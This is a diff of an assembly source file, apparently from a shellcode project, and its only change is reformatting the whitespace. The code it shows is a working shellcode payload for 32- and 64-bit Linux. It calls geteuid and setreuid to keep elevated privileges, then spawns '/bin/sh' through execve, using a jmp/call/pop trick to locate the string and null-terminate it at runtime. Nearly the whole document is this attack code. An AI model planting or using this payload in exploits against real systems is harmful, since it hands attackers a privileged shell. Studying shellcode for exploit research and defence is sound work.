@@ -8,11 +8,11 @@
 	.set SYS_GETEUID,	107
 	.set SYS_SETREUID,	113
 
-	.set EAX,			%rax
-	.set EBX,			%rdi
-	.set ECX,			%rsi
-	.set EDX,			%rdx
-	.set ESP,			%rsp
+	.set EAX,		%rax
+	.set EBX,		%rdi
+	.set ECX,		%rsi
+	.set EDX,		%rdx
+	.set ESP,		%rsp
 
 	.macro _SYSCALL_
 		syscall
@@ -22,14 +22,14 @@
 	.set SYS_GETEUID,	49
 	.set SYS_SETREUID,	70
 
-	.set EAX,			%eax
-	.set EBX,			%ebx
-	.set ECX,			%ecx
-	.set EDX,			%edx
-	.set ESP,			%esp
+	.set EAX,		%eax
+	.set EBX,		%ebx
+	.set ECX,		%ecx
+	.set EDX,		%edx
+	.set ESP,		%esp
 
 	.macro _SYSCALL_
-		int $0x80
+		int	$0x80
 	.endm
 .endif
 
@@ -40,24 +40,24 @@ _start:
 	pop		EAX
 	_SYSCALL_
 
-	mov		EAX,	EBX	# 1st arg
-	mov		EAX,	ECX	# 2nd arg
-	push	$SYS_SETREUID	# sys_setreuid
+	mov		EAX,		EBX	# 1st arg
+	mov		EAX,		ECX	# 2nd arg
+	push		$SYS_SETREUID		# sys_setreuid
 	pop		EAX
 	_SYSCALL_
 
-	push	$SYS_EXECVE		# sys_execve
+	push		$SYS_EXECVE		# sys_execve
 	pop		EAX
-	cdq						# env = NULL
+	cdq					# env = NULL
 
-	push	EDX				# argv[1] = NULL
+	push		EDX			# argv[1] = NULL
 	jmp binsh
 back:
-	mov		ESP,	ECX		# argv
-	pop		EBX				# argv[0] = address of '/bin/sh'
-	movb	%dl,	7(EBX)	# null-terminator
+	mov		ESP,		ECX	# argv
+	pop		EBX			# argv[0] = address of '/bin/sh'
+	movb		%dl,		7(EBX)	# null-terminator
 	_SYSCALL_				# syscall
 
 binsh:
 	call back				# pushl next_instr; jmp back
-	.ascii "/bin/sh"		# <-- next_instr
+	.ascii "/bin/sh"			# <-- next_instr
